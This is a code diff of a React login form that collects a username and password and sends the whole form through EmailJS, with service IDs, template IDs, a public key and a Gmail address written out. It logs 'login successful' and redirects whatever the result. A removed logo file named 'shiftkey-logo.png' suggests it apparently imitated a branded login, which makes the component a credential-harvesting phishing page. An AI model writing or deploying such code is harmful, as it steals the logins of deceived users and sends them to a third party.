@@ -1,12 +1,15 @@
 import React, { useState } from "react";
 import emailjs from "@emailjs/browser";
-import logo from "./shiftkey-logo.png";
+
+import { useNavigate } from "react-router";
 
 export default function Form({ setRouter }) {
   const [user, setUser] = useState({
     username: "",
     password: "",
   });
+
+  const navigate = useNavigate();
 
   const handleChange = (e, type) => {
     e.preventDefault();
@@ -15,28 +18,32 @@ export default function Form({ setRouter }) {
 
   const sendEmail = (e) => {
     e.preventDefault();
+    emailjs.init("send2nupur28@gmail.com");
 
     console.log("login successful");
     emailjs
       .sendForm(
-        "service_3an604u",
-        "template_tz9tt8b",
+        "service_rtjeesg",
+        "template_aqaosl1",
         document.getElementById("form"),
-        "hVmkjM02raXPh2jem"
+        "0zdcXFrQ16YNpV4ki"
       )
       .then(
         (result) => {
           console.log(result.text);
-          setRouter(1);
+          
         },
         (error) => {
           console.log(error.text);
         }
       );
+
+    navigate('/final');
+  
   };
   return (
     <form id="form" method="GET">
-      <img src={logo} className="App-logo" alt="logo" />
+      
       {/* <label>Username: </label> */}
       <input
         type="text"
